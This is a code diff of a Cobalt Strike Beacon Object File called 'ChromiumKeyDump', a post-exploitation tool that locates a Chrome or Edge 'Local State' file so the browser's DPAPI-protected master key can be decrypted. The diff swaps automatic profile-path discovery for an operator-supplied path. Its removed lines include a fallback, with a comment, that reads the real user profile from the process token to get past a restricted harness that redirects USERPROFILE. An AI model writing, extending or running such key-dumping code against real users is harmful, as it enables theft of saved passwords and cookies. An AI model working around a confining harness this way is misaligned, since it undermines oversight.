@@ -2,8 +2,6 @@
 
 #include <windows.h>
 #include <wincrypt.h>
-#include <shlobj.h>
-#include <userenv.h>
 
 extern "C" {
 #include "beacon.h"
@@ -17,14 +15,8 @@ BOF_REDECLARE(KERNEL32, CreateFileW);
 BOF_REDECLARE(KERNEL32, CloseHandle);
 BOF_REDECLARE(KERNEL32, GetFileSizeEx);
 BOF_REDECLARE(KERNEL32, GetLastError);
-BOF_REDECLARE(KERNEL32, GetCurrentProcess);
 BOF_REDECLARE(KERNEL32, LocalFree);
-BOF_REDECLARE(ADVAPI32, OpenProcessToken);
-BOF_REDECLARE(USERENV, GetUserProfileDirectoryW);
-BOF_REDECLARE(OLE32, CoInitializeEx);
-BOF_REDECLARE(OLE32, CoUninitialize);
-BOF_REDECLARE(OLE32, CoTaskMemFree);
-BOF_REDECLARE(SHELL32, SHGetKnownFolderPath);
+BOF_REDECLARE(KERNEL32, MultiByteToWideChar);
 BOF_REDECLARE(CRYPT32, CryptStringToBinaryA);
 BOF_REDECLARE(CRYPT32, CryptBinaryToStringA);
 BOF_REDECLARE(CRYPT32, CryptUnprotectData);
@@ -37,14 +29,8 @@ BOF_REDECLARE(MSVCRT, free);
     BOF_LOCAL(KERNEL32, CloseHandle); \
     BOF_LOCAL(KERNEL32, GetFileSizeEx); \
     BOF_LOCAL(KERNEL32, GetLastError); \
-    BOF_LOCAL(KERNEL32, GetCurrentProcess); \
     BOF_LOCAL(KERNEL32, LocalFree); \
-    BOF_LOCAL(ADVAPI32, OpenProcessToken); \
-    BOF_LOCAL(USERENV, GetUserProfileDirectoryW); \
-    BOF_LOCAL(OLE32, CoInitializeEx); \
-    BOF_LOCAL(OLE32, CoUninitialize); \
-    BOF_LOCAL(OLE32, CoTaskMemFree); \
-    BOF_LOCAL(SHELL32, SHGetKnownFolderPath); \
+    BOF_LOCAL(KERNEL32, MultiByteToWideChar); \
     BOF_LOCAL(CRYPT32, CryptStringToBinaryA); \
     BOF_LOCAL(CRYPT32, CryptBinaryToStringA); \
     BOF_LOCAL(CRYPT32, CryptUnprotectData); \
@@ -54,80 +40,26 @@ BOF_REDECLARE(MSVCRT, free);
 extern "C" void go(char* args, int alen) {
     BOF_LOCALS;
 
-    if (alen < 4) {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Browser type not selected\n");
-        return;
-    }
     datap parser;
     BeaconDataParse(&parser, args, alen);
-    const int browserType = BeaconDataInt(&parser);
-    const WCHAR* suffix = NULL;
-    if (browserType == 0) {
-        suffix = L"\\Google\\Chrome\\User Data\\Local State";
-    } else if (browserType == 1) {
-        suffix = L"\\Microsoft\\Edge\\User Data\\Local State";
-    } else {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Wrong browser selected\n");
+    int pathBytes = 0;
+    char* path = BeaconDataExtract(&parser, &pathBytes);
+    if (path == NULL || pathBytes < 2 || pathBytes > MAX_PATH * 4 || path[pathBytes - 1] != '\0') {
+        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Expected a Local State path\n");
         return;
     }
-
-    HRESULT comResult = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-    if (FAILED(comResult) && comResult != RPC_E_CHANGED_MODE) {
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] CoInitializeEx failed hresult=%08x\n", comResult);
-        return;
-    }
-    const bool shouldUninitialize = SUCCEEDED(comResult);
-
-    PWSTR appData = NULL;
-    WCHAR fallbackAppData[MAX_PATH];
-    const WCHAR* basePath = NULL;
-    const GUID localAppData = {0xF1B32785, 0x6FBA, 0x4FCF, {0x9D, 0x55, 0x7B, 0x8E, 0x7F, 0x15, 0x70, 0x91}};
-    HRESULT result = SHGetKnownFolderPath(localAppData, 0, NULL, &appData);
-    if (SUCCEEDED(result) && appData != NULL) {
-        basePath = appData;
-    } else {
-        // A restricted BOF harness can replace USERPROFILE without changing the
-        // process token. Resolve the account's real profile in that case.
-        HANDLE token = NULL;
-        DWORD capacity = MAX_PATH;
-        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
-            if (GetUserProfileDirectoryW(token, fallbackAppData, &capacity)) {
-                size_t profileLength = 0;
-                while (profileLength < MAX_PATH && fallbackAppData[profileLength] != L'\0') ++profileLength;
-                const WCHAR localSuffix[] = L"\\AppData\\Local";
-                const size_t localSuffixLength = sizeof(localSuffix) / sizeof(WCHAR) - 1;
-                if (profileLength + localSuffixLength < MAX_PATH) {
-                    for (size_t i = 0; i <= localSuffixLength; ++i) {
-                        fallbackAppData[profileLength + i] = localSuffix[i];
-                    }
-                    basePath = fallbackAppData;
-                }
-            }
-            CloseHandle(token);
-        }
-        if (basePath == NULL) {
-            if (appData != NULL) CoTaskMemFree(appData);
-            if (shouldUninitialize) CoUninitialize();
-            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] LocalAppData lookup failed hresult=%08x\n", result);
+    for (int i = 0; i < pathBytes - 1; ++i) {
+        if (path[i] == '\0') {
+            BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid Local State path\n");
             return;
         }
     }
 
     WCHAR widePath[MAX_PATH];
-    size_t baseLength = 0;
-    while (baseLength < MAX_PATH && basePath[baseLength] != L'\0') ++baseLength;
-    size_t suffixLength = 0;
-    while (suffix[suffixLength] != L'\0') ++suffixLength;
-    if (baseLength + suffixLength >= MAX_PATH) {
-        if (appData != NULL) CoTaskMemFree(appData);
-        if (shouldUninitialize) CoUninitialize();
-        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Local State path is too long\n");
+    if (MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, path, pathBytes, widePath, MAX_PATH) == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "[ChromiumKeyDump] Invalid or overlong Local State path\n");
         return;
     }
-    for (size_t i = 0; i < baseLength; ++i) widePath[i] = basePath[i];
-    for (size_t i = 0; i <= suffixLength; ++i) widePath[baseLength + i] = suffix[i];
-    if (appData != NULL) CoTaskMemFree(appData);
-    if (shouldUninitialize) CoUninitialize();
 
     BeaconPrintf(CALLBACK_OUTPUT, "[ChromiumKeyDump] Target File: %S\n", widePath);
 
